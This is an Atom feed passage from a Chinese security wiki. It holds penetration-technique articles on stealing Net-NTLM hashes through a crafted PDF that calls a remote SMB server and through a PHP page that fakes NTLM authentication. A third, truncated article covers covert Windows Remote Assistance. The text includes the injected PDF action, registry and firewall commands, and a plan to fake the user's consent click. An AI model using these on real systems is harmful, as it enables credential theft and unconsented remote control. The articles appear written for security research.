<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wiki</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="wiki.cfyqy.com/"/>
  <updated>2018-05-25T13:04:28.167Z</updated>
  <id>wiki.cfyqy.com/</id>
  
  <author>
    <name>wiki</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透技巧——利用PDF文件获取Net-NTLM hash</title>
    <link href="wiki.cfyqy.com/posts/9906b85f.html"/>
    <id>wiki.cfyqy.com/posts/9906b85f.html</id>
    <published>2018-05-25T13:03:44.937Z</published>
    <updated>2018-05-25T13:04:28.167Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>今年4月，来自CheckPoint的Assaf Baharav公开了一个方法，利用PDF文件的正常功能够窃取Windows系统的NTLM Hash。</p><p>具体的说，当用户使用PDF阅读器打开一份恶意的PDF文档，该PDF会向远程SMB服务器发出请求，如果该远程SMB服务器对数据包进行抓取，就能够获得用户Windows系统的Net<br> NTLM Hash，通过进一步破解就有可能获得用户系统的明文密码。</p><p>然而Microsoft、Adobe和FoxIT对此没有进行针对性的修复。</p><p>这个利用方法成功的条件有哪些？没有修复的原因又是什么呢？</p><p>本文将要站在技术研究的角度进行介绍</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>原理和利用思路</li><li>测试POC，生成一个恶意PDF文件</li><li>分析PDF文件格式</li><li>编写脚本实现修改正常PDF文件</li><li>开源代码</li></ul><h2 id="0x02-原理和利用思路"><a href="#0x02-原理和利用思路" class="headerlink" title="0x02 原理和利用思路"></a>0x02 原理和利用思路</h2><hr><p>参考资料：</p><p><a href="https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/" target="_blank" rel="noopener">https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/</a></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>PDF规范允许为GoTobe和GoToR条目加载远程内容</p><p> <strong>直观的理解：</strong></p><p>PDF文件可以添加一项功能，请求远程SMB服务器的文件</p><p>而我们知道，Windows系统下SMB协议有一个特性：客户端在连接SMB服务器时，默认先使用本机的用户名和密码hash尝试登录，通信协议默认为Net-NTLMv1或者Net-NTLMv2</p><p>工具Hashcat提供了字典和暴力破解两种方法来还原Net-NTLMv1和Net-NTLMv2协议中的明文密码</p><p>只要在SMB服务器上进行抓包，提取关键数据，就能够获得Hashcat需要的参数，尝试破解</p><p>抓包可选择WireShark，对获得的pcap包进行解析，提取关键数据。如果使用Responder可自动提取出关键数据。</p><p>之前写过的相关文章：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》</a></p><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/" target="_blank" rel="noopener">《渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash》</a></p><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E5%9B%BE%E6%A0%87%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/" target="_blank" rel="noopener">《渗透技巧——利用图标文件获取连接文件服务器的NTLMv2 Hash》</a></p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">《Windows下的密码hash——Net-NTLMv1介绍》</a></p><p>类似的利用思路：</p><p>可参考以下文章：</p><p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</a></p><p>介绍了多种文件格式的利用方法</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>构造一份特殊的PDF文档，请求SMB服务器的一份文件</li><li>在SMB服务器上抓包</li><li>用户使用PDF阅读器打开PDF文档时，Windows系统将当前用户的Net NTLM Hash发送到SMB服务器</li><li>SMB服务器提取出Net NTLM Hash，使用Hashcat进行破解</li><li>还原出用户的明文密码</li><li>根据用户的明文密码尝试进一步利用</li></ul><h2 id="0x03-测试POC"><a href="#0x03-测试POC" class="headerlink" title="0x03 测试POC"></a>0x03 测试POC</h2><hr><p>Assaf Baharav在他的文章中已经公开了POC，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-3/2-1.png" alt="Alt text"></p><p><strong>注：</strong></p><p>图片引用自<a href="https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/" target="_blank" rel="noopener">https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/</a></p><p>如果想要直接进行测试，可参考Deepu TV的POC，地址如下：</p><p><a href="https://github.com/deepzec/Bad-Pdf" target="_blank" rel="noopener">https://github.com/deepzec/Bad-Pdf</a></p><h3 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h3><p>Client:</p><ul><li>IP: 192.168.62.135</li><li>OS: Win7 x86</li></ul><p>SMB Server：</p><ul><li>IP: 192.168.62.139</li><li>OS: Win8 x86</li><li>开放共享文件夹: test</li></ul><h4 id="1、使用Bad-Pdf生成PDF文件"><a href="#1、使用Bad-Pdf生成PDF文件" class="headerlink" title="1、使用Bad-Pdf生成PDF文件"></a>1、使用Bad-Pdf生成PDF文件</h4><p>本次测试对Bad-Pdf.py做部分修改，不执行Responder</p><p>设置host IP: <code>192.168.62.139</code></p><p>协议选择<code>SMB</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-3/2-2.png" alt="Alt text"></p><p>生成测试PDF文件<code>badpdf.pdf</code></p><h4 id="2、SMBServer进行抓包"><a href="#2、SMBServer进行抓包" class="headerlink" title="2、SMBServer进行抓包"></a>2、SMBServer进行抓包</h4><p>开启Wireshark</p><h4 id="3、Clinet使用Adobe-Reader打开badpdf-pdf"><a href="#3、Clinet使用Adobe-Reader打开badpdf-pdf" class="headerlink" title="3、Clinet使用Adobe Reader打开badpdf.pdf"></a>3、Clinet使用Adobe Reader打开badpdf.pdf</h4><h4 id="4、查看Wireshark，成功获得Net-NTLM-Hash的数据包"><a href="#4、查看Wireshark，成功获得Net-NTLM-Hash的数据包" class="headerlink" title="4、查看Wireshark，成功获得Net NTLM Hash的数据包"></a>4、查看Wireshark，成功获得Net NTLM Hash的数据包</h4><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-3/2-3.png" alt="Alt text"></p><h2 id="0x04-POC细节分析"><a href="#0x04-POC细节分析" class="headerlink" title="0x04 POC细节分析"></a>0x04 POC细节分析</h2><hr><p>参考代码：</p><p><a href="https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py" target="_blank" rel="noopener">https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py</a></p><p>Assaf Baharav的POC是在脚本中写好了PDF文件的模板</p><p>下面对其中的关键代码进行说明：</p><p>(1)</p><pre><code>2 0 obj&lt;&lt;/Type/Pages/Kids[3 0 R]/Count 1&gt;&gt;endobj</code></pre><p><code>/Type /Pages</code>表示对象的类型为页码</p><p><code>/Kids[3 0 R]</code>表示页的对象是3</p><p><code>/Count 1</code>表示页码数量为1</p><p>(2)</p><pre><code>3 0 obj&lt;&lt;/Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources&lt;&lt;&gt;&gt;&gt;&gt;endobj</code></pre><p><code>/Parent 2 0 R</code>表示父对象是2，同(1)中<code>/Kids[3</code>对应</p><p><code>/MediaBox</code>表示页面的显示大小（以象素为单位）</p><p>(3)</p><pre><code>xref0 40000000000 65535 f0000000015 00000 n0000000060 00000 n0000000111 00000 n</code></pre><p><code>xref</code>表示这部分为交叉引用表</p><p><code>0 4</code>表示下面各行所描述的对象号是从0开始，并且有4个对象</p><p><code>0000000000 65535 f</code>固定格式，可看作文件头</p><p><code>0000000015 00000 n</code>对应第一个对象，<code>0000000015</code>表示偏移地址(十进制);<code>00000</code>为5位产生号（最大为65535），0表明该对象未被修改过; n表示该对象在使用，如果为f，表示该对象为free</p><p>(4)</p><pre><code>trailer&lt;&lt;/Size 4/Root 1 0 R&gt;&gt;startxref190...中间省略的代码...trailer&lt;&lt;    /Root 1 0 R&gt;&gt;%%EOF</code></pre><p><code>trailer</code>表示文件尾trailer对象的开始</p><p><code>/Size 4</code>表示该PDF文件的对象数目为4</p><p><code>/Root 1 0 R</code>表示根对象的对象号为1</p><p><code>startxref 190</code>表示交叉引用表的偏移地址为190</p><p><code>%%EOF</code>表示文件结束标志</p><p>(5)</p><pre><code>3 0 obj&lt;&lt; /Type /Page   /Contents 4 0 R   /AA &lt;&lt;       /O &lt;&lt;          /F (&#39;&#39;&#39; + host + &#39;&#39;&#39;test)          /D [ 0 /Fit]          /S /GoToE          &gt;&gt;       &gt;&gt;       /Parent 2 0 R       /Resources &lt;&lt;            /Font &lt;&lt;                /F1 &lt;&lt;                    /Type /Font                    /Subtype /Type1                    /BaseFont /Helvetica                    &gt;&gt;                  &gt;&gt;                &gt;&gt;&gt;&gt;endobj</code></pre><p>此处为关键代码，实现远程访问</p><p><code>/Contents 4 0 R</code>表示页面内容对象的对象号为4</p><p><code>/Parent 2 0 R</code>表示父对象是2</p><p>在<code>/Contents 4 0 R</code>和<code>/Parent 2 0 R</code>直接为实现远程访问的代码</p><p>对于PDF文件格式，不需要换行符，所以这段代码去掉换行符和空格，填入ServerIP后为<code>/AA &lt;&lt;/O &lt;&lt;/F (\\\\192.168.62.139\\test)/D [ 0 /Fit]/S /GoToE&gt;&gt;&gt;&gt;</code></p><h2 id="0x05-修改正常PDF文件"><a href="#0x05-修改正常PDF文件" class="headerlink" title="0x05 修改正常PDF文件"></a>0x05 修改正常PDF文件</h2><hr><p>接下来，尝试修改正常的文件，添加代码，实现远程访问功能</p><p>使用工具生成的PDF文件一般都很大，分析格式不是很方便，这里提供一个python生成PDF的参考代码，地址如下：</p><p><a href="http://code.activestate.com/recipes/189858/" target="_blank" rel="noopener">http://code.activestate.com/recipes/189858/</a></p><p>输入txt文件，输出pdf文件</p><h3 id="实际测试-1"><a href="#实际测试-1" class="headerlink" title="实际测试"></a>实际测试</h3><p>1.txt的内容为：</p><pre><code>1234567</code></pre><p>cmd:</p><pre><code>recipe-189858-1.py 1.txt</code></pre><p>生成的pdf文件<code>1.txt.pdf</code>，文件大小1213 bytes</p><p>查看1.txt.pdf的文件格式，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-3/3-1.png" alt="Alt text"></p><p>在<code>/Parent 3 0 R</code>和<code>/Resources 5 0 R</code>直接添加代码<code>/AA &lt;&lt;/O &lt;&lt;/F (\\\\192.168.62.139\\test)/D [ 0 /Fit]/S /GoToE&gt;&gt;&gt;&gt;</code></p><p><strong>注:</strong></p><p>需要十六进制编辑，使用文本编辑会导致PDF文件出错</p><p>对PDF文件添加上述代码后，交叉引用表中对象的偏移位置会出现偏差，需要重新计算，修正偏移位置</p><p>使用Adobe Reader打开修改后的文件<code>1.txt.pdf</code>，SMB服务器成功抓到Net NTLM Hash，修改成功</p><h2 id="0x06-脚本编写"><a href="#0x06-脚本编写" class="headerlink" title="0x06 脚本编写"></a>0x06 脚本编写</h2><hr><p>经实际测试，不修正交叉引用表中对象的偏移位置，不会影响PDF文件的正常访问</p><p>所以脚本编写上只需要定位<code>/Parent &lt;n&gt; 0 R</code>后，添加访问远程文件的代码即可</p><p>值得注意的是PDF文件的读取和写入需要以二进制格式</p><p>实现代码已开源，可参考：</p><p><a href="https://github.com/3gstudent/Worse-PDF" target="_blank" rel="noopener">https://github.com/3gstudent/Worse-PDF</a></p><h2 id="0x07-利用分析"><a href="#0x07-利用分析" class="headerlink" title="0x07 利用分析"></a>0x07 利用分析</h2><hr><p>成功利用需要满足以下条件：</p><ul><li>用户使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行</li></ul><p>对于Windows系统，通过Net NTLM Hash破解出明文有一定难度</p><p>即使破解出了明文，利用的效果也有限(例如普通用户的Windows系统很少开启远程登录功能)</p><h2 id="0x08-防御"><a href="#0x08-防御" class="headerlink" title="0x08 防御"></a>0x08 防御</h2><hr><p>虽然微软并未针对这个利用方法进行针对性的修复，但在之前已经提供了一个防御的方法，参考地址：</p><p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170014" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170014</a></p><p>但只支持Win10和Server2016</p><h2 id="0x09-小结"><a href="#0x09-小结" class="headerlink" title="0x09 小结"></a>0x09 小结</h2><hr><p>本文测试了利用PDF文件获取Net-NTLM hash的方法，分析原理，根据PDF的文件格式尝试编写脚本实现修改正常的PDF文件，开源代码，总结利用条件。</p><p>最后，个人也认为Microsoft没有必要对此进行针对性的修复。</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>渗透技巧——利用PHP脚本从浏览器中获得Net-NTLM hash</title>
    <link href="wiki.cfyqy.com/posts/4a33576b.html"/>
    <id>wiki.cfyqy.com/posts/4a33576b.html</id>
    <published>2018-05-25T13:03:44.935Z</published>
    <updated>2018-05-25T13:04:28.166Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>在上篇文章《渗透技巧——通过HTTP协议获得Net-NTLM hash》介绍了通过HTTP协议获得客户端当前登录用户Net-NTLM hash的方法，侧重于介绍原理和思路，本文将要给出一个具体的实现方法，利用PHP脚本模拟Net-NTLM认证过程，提取出客户端的Net-NTLM hash</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>Net-NTLM认证过程</li><li>利用PHP脚本模拟认证过程</li><li>脚本编写细节</li><li>实际测试</li></ul><h2 id="0x02-Net-NTLM认证过程"><a href="#0x02-Net-NTLM认证过程" class="headerlink" title="0x02 Net-NTLM认证过程"></a>0x02 Net-NTLM认证过程</h2><hr><p>参考资料：</p><p><a href="https://www.innovation.ch/personal/ronald/ntlm.html" target="_blank" rel="noopener">https://www.innovation.ch/personal/ronald/ntlm.html</a></p><p>依然使用这幅图，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/2-1.png" alt="Alt text"></p><p><strong>注：</strong></p><p>图片截取自<a href="https://www.innovation.ch/personal/ronald/ntlm.html" target="_blank" rel="noopener">https://www.innovation.ch/personal/ronald/ntlm.html</a></p><h2 id="0x03-利用PHP脚本模拟认证过程"><a href="#0x03-利用PHP脚本模拟认证过程" class="headerlink" title="0x03 利用PHP脚本模拟认证过程"></a>0x03 利用PHP脚本模拟认证过程</h2><hr><p>想要通过PHP脚本模拟Net-NTLM认证过程，主要考虑的是Server端的实现</p><h3 id="1、发送WWW-Authenticate-NTLM"><a href="#1、发送WWW-Authenticate-NTLM" class="headerlink" title="1、发送WWW-Authenticate: NTLM"></a>1、发送<code>WWW-Authenticate: NTLM</code></h3><p>接收Client的GET请求，回复<code>401 Unauthorized WWW-Authenticate: NTLM</code>，提示Client需要NTLM认证</p><h3 id="2、发送WWW-Authenticate-NTLM-lt-base64-encoded-type-2-message-gt"><a href="#2、发送WWW-Authenticate-NTLM-lt-base64-encoded-type-2-message-gt" class="headerlink" title="2、发送WWW-Authenticate: NTLM &lt;base64-encoded type-2-message&gt;"></a>2、发送<code>WWW-Authenticate: NTLM &lt;base64-encoded type-2-message&gt;</code></h3><p>接收Client的<code>Type-1-Message</code>，回复<code>Type-2-message</code></p><p>The Type 2 Message的结构如下：</p><table><thead><tr><th>Offset</th><th style="text-align:center">Description</th><th style="text-align:right">Content</th></tr></thead><tbody><tr><td>0</td><td style="text-align:center">NTLMSSP Signature</td><td style="text-align:right">Null-terminated ASCII “NTLMSSP” (0x4e544c4d53535000)</td></tr><tr><td>8</td><td style="text-align:center">NTLM Message Type</td><td style="text-align:right">long (0x02000000)</td></tr><tr><td>12</td><td style="text-align:center">Target Name</td><td style="text-align:right">security buffer</td></tr><tr><td>20</td><td style="text-align:center">Flags</td><td style="text-align:right">long</td></tr><tr><td>24</td><td style="text-align:center">Challenge</td><td style="text-align:right">8 bytes</td></tr><tr><td>(32)</td><td style="text-align:center">Context (optional)</td><td style="text-align:right">8 bytes (two consecutive longs)</td></tr><tr><td>(40)</td><td style="text-align:center">Target Information (optional)</td><td style="text-align:right">security buffer</td></tr><tr><td>(48)</td><td style="text-align:center">OS Version Structure (Optional)</td><td style="text-align:right">8 bytes</td></tr></tbody></table><p>详细参数说明可参考：</p><p><a href="http://davenport.sourceforge.net/ntlm.html#theType2Message" target="_blank" rel="noopener">http://davenport.sourceforge.net/ntlm.html#theType2Message</a></p><p>值得注意的参数为<code>Flags</code>和<code>Challenge</code></p><p>Challenge是使用hashcat破解Net-NTLM hash的必须参数</p><p>Flags包含多种类型，一个简单的Flags示例，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/2-2.png" alt="Alt text"></p><p>对应的数据格式如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/2-4.png" alt="Alt text"></p><h3 id="3、解析Type-3-message"><a href="#3、解析Type-3-message" class="headerlink" title="3、解析Type-3-message"></a>3、解析Type-3-message</h3><p>Type-3-message包含Client加密后的Net-NTLM hash消息，提取出对应格式的数据可用于破解</p><p>Type-3-message示例如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/2-3.png" alt="Alt text"></p><p>这里需要注意每个参数的存储格式</p><pre><code>short   Length;short   Maxlen;short   Offset;</code></pre><p>Offset对应参数具体内容的偏移地址</p><h3 id="4、发送网页内容"><a href="#4、发送网页内容" class="headerlink" title="4、发送网页内容"></a>4、发送网页内容</h3><p>Server向Client提供最终的请求内容</p><h2 id="0x04-脚本编写细节"><a href="#0x04-脚本编写细节" class="headerlink" title="0x04 脚本编写细节"></a>0x04 脚本编写细节</h2><hr><p>为了便于测试，不会对用户提交的凭据做验证，直接在HTTP的回复内容中返回用户的验证凭据</p><p>完整POC代码已开源，地址如下：</p><p><a href="https://raw.githubusercontent.com/3gstudent/Writeup/master/catchyournetntlm.php" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/Writeup/master/catchyournetntlm.php</a></p><p>POC代码基于<a href="https://loune.net/2007/10/simple-lightweight-ntlm-in-php/" target="_blank" rel="noopener">https://loune.net/2007/10/simple-lightweight-ntlm-in-php/</a></p><p>做了以下优化：</p><h4 id="1、不再局限于apache-module"><a href="#1、不再局限于apache-module" class="headerlink" title="1、不再局限于apache module"></a>1、不再局限于apache module</h4><p>原脚本只能在apache下使用</p><h4 id="2、提取Net-NTLM-hash"><a href="#2、提取Net-NTLM-hash" class="headerlink" title="2、提取Net-NTLM hash"></a>2、提取Net-NTLM hash</h4><p>原脚本输出Client的三个属性： <code>$user</code> <code>$domain</code> <code>$workstation</code></p><p>新脚本添加了文件格式解析的功能，提取出<code>HMAC-MD5</code>和<code>blob</code></p><p><strong>脚本细节：</strong></p><p>原POC中的<code>function get_msg_str($msg, $start, $unicode = true)</code></p><p>在调用<code>$user = get_msg_str($msg, 36);</code>时，由于之前的Flags指定了<code>unicode</code>，所以默认执行以下代码：</p><pre><code>if ($unicode)        return str_replace(&quot;\0&quot;, &#39;&#39;, substr($msg, $off, $len));</code></pre><p>会自动去除字符串中的<code>0x00</code></p><p>而在提取<code>HMAC-MD5</code>和<code>blob</code>时，需要保留<code>0x00</code>，所以我们要传入参数false，不对字符<code>0x00</code>进行过滤</p><p>具体的代码为：</p><pre><code>$Response = get_msg_str($msg, 20,false);</code></pre><p>至于<code>challenge</code>，在脚本中指定为<code>0x0000000000000000</code>，所以最后拼接hashcat的格式时直接设置为<code>0x0000000000000000</code>即可</p><h2 id="0x05-实际测试"><a href="#0x05-实际测试" class="headerlink" title="0x05 实际测试"></a>0x05 实际测试</h2><hr><h3 id="1、本地测试"><a href="#1、本地测试" class="headerlink" title="1、本地测试"></a>1、本地测试</h3><p><strong>Server：</strong></p><p>安装apache环境</p><p>简单的配置方法:  安装phpstudy</p><p>上传脚本catchyournetntlm.php</p><p><strong>Client：</strong></p><p>修改IE配置文件，将登录方式修改为<code>Automatic logon with current user name and password</code></p><p>对应命令如下：</p><pre><code>REG ADD &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3&quot; /v 1A00 /t REG_DWORD /d 00000000 /f</code></pre><p><strong>注：</strong></p><p>域环境下不需要这个设置</p><p>Client访问服务器上的catchyournetntlm.php，服务器获得用户的Net-NTLM hash，提取出固定格式返回至Client</p><p>Client显示如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/3-1.png" alt="Alt text"></p><p>数据可直接用于hashcat的破解</p><h3 id="2、在线测试"><a href="#2、在线测试" class="headerlink" title="2、在线测试"></a>2、在线测试</h3><p><a href="https://evi1cg.me/test.php" target="_blank" rel="noopener">https://evi1cg.me/test.php</a></p><p>服务器使用nginx，未使用apache</p><p><strong>注：</strong></p><p>nginx下脚本的优化由evilcg完成</p><p>Client使用默认登录方法，访问该网址弹出对话框提示输入密码，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/4-1.png" alt="Alt text"></p><p>任意输入，获得输入内容的Net-NTLM hash，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/4-2.png" alt="Alt text"></p><p>将Client的登录方式修改为<code>Automatic logon with current user name and password</code>，访问该网址自动获得Client当前用户的Net-NTLM hash，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-10/4-3.png" alt="Alt text"></p><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><hr><p>本文介绍了利用PHP脚本从浏览器中获得Net-NTLM hash的方法，分享脚本编写细节，实际测试该方法的效果。</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>渗透技巧——Windows远程协助的隐蔽执行</title>
    <link href="wiki.cfyqy.com/posts/a450765a.html"/>
    <id>wiki.cfyqy.com/posts/a450765a.html</id>
    <published>2018-05-25T13:03:44.933Z</published>
    <updated>2018-05-25T13:04:28.166Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>对于Windows系统，经常会用到远程桌面服务，通过界面对系统进行远程管理。</p><p>这其中存在一个不足：使用远程桌面服务进行远程登录(使用另一用户或是踢掉当前用户)，无法获取到当前用户的系统状态。</p><p>如果想要查看(甚至是操作)当前用户的桌面，有什么好办法呢？</p><p>虽然我们可以通过编写程序来实现界面操作（捕获桌面信息，压缩传输，发送鼠标键盘消息等），但是如果能够使用Windows系统的默认功能，岂不是更好？</p><p>答案就是Windows系统的远程协助。</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>远程协助的基本操作</li><li>命令行下操作</li><li>编写c++程序隐藏界面，发送键盘消息，模拟用户点击确认</li><li>完整利用流程</li><li>检测方法</li></ul><h2 id="0x02-远程协助的基本操作"><a href="#0x02-远程协助的基本操作" class="headerlink" title="0x02 远程协助的基本操作"></a>0x02 远程协助的基本操作</h2><hr><h3 id="1、开启远程协助功能"><a href="#1、开启远程协助功能" class="headerlink" title="1、开启远程协助功能"></a>1、开启远程协助功能</h3><p><code>System Properties</code> -&gt; <code>Remote</code></p><p>选中<code>Allow Remote Assistance connections to this computer</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-1.png" alt="Alt text"></p><h3 id="2、添加防火墙规则，允许远程协助的通信端口"><a href="#2、添加防火墙规则，允许远程协助的通信端口" class="headerlink" title="2、添加防火墙规则，允许远程协助的通信端口"></a>2、添加防火墙规则，允许远程协助的通信端口</h3><p><code>Windows Firewall</code> -&gt; <code>Allowed Programs</code></p><p>选中<code>Remote Assistance</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-2.png" alt="Alt text"></p><h3 id="3、启动界面程序"><a href="#3、启动界面程序" class="headerlink" title="3、启动界面程序"></a>3、启动界面程序</h3><p>运行 -&gt; <code>msra.exe</code></p><h3 id="4、配置本机为服务端，请求其他人协助"><a href="#4、配置本机为服务端，请求其他人协助" class="headerlink" title="4、配置本机为服务端，请求其他人协助"></a>4、配置本机为服务端，请求其他人协助</h3><p>选中<code>Invite someone you trust to help you</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-3.png" alt="Alt text"></p><p>选中<code>Save this invitation as a file</code> </p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-4.png" alt="Alt text"></p><p>保存为文件<code>Invitation.msrcincident</code></p><p>自动弹出界面，生成一个随机密码，记录该密码，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-5.png" alt="Alt text"></p><h3 id="5、控制端发起远程连接"><a href="#5、控制端发起远程连接" class="headerlink" title="5、控制端发起远程连接"></a>5、控制端发起远程连接</h3><p>控制端运行文件<code>Invitation.msrcincident</code>，填入上一步生成的密码，发起远程连接</p><h3 id="6、服务端确认连接请求"><a href="#6、服务端确认连接请求" class="headerlink" title="6、服务端确认连接请求"></a>6、服务端确认连接请求</h3><p>服务端弹框，需要用户确认，允许远程协助，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-4/2-6.png" alt="Alt text"></p><p>选择Yes，远程协助成功建立</p><h2 id="0x03-命令行下操作"><a href="#0x03-命令行下操作" class="headerlink" title="0x03 命令行下操作"></a>0x03 命令行下操作</h2><hr><h3 id="1、开启系统远程协助"><a href="#1、开启系统远程协助" class="headerlink" title="1、开启系统远程协助"></a>1、开启系统远程协助</h3><p>修改注册表项<code>HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance</code>下的键值<code>fAllowToGetHelp</code>，1代表允许，0代表禁止</p><pre><code>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance&quot; /v fAllowToGetHelp /t REG_DWORD /d 1 /f</code></pre><h3 id="2、配置防火墙规则，允许远程协助的通信端口"><a href="#2、配置防火墙规则，允许远程协助的通信端口" class="headerlink" title="2、配置防火墙规则，允许远程协助的通信端口"></a>2、配置防火墙规则，允许远程协助的通信端口</h3><pre><code>netsh advfirewall firewall set rule group=&quot;Remote Assistance&quot; new enable=Yes</code></pre><h3 id="3、创建远程协助文件，后台等待用户连接"><a href="#3、创建远程协助文件，后台等待用户连接" class="headerlink" title="3、创建远程协助文件，后台等待用户连接"></a>3、创建远程协助文件，后台等待用户连接</h3><pre><code>msra /saveasfile c:\test\1.msrcIncident 123456789012</code></pre><p>保存文件路径为<code>c:\test\1.msrcIncident</code>，连接密码为<code>123456789012</code></p><h2 id="0x04-编写c程序隐藏界面，发送键盘消息，模拟用户点击确认"><a href="#0x04-编写c程序隐藏界面，发送键盘消息，模拟用户点击确认" class="headerlink" title="0x04 编写c程序隐藏界面，发送键盘消息，模拟用户点击确认"></a>0x04 编写c程序隐藏界面，发送键盘消息，模拟用户点击确认</h2><hr><h3 id="1、隐藏msra-exe的界面"><a href="#1、隐藏msra-exe的界面" class="headerlink" 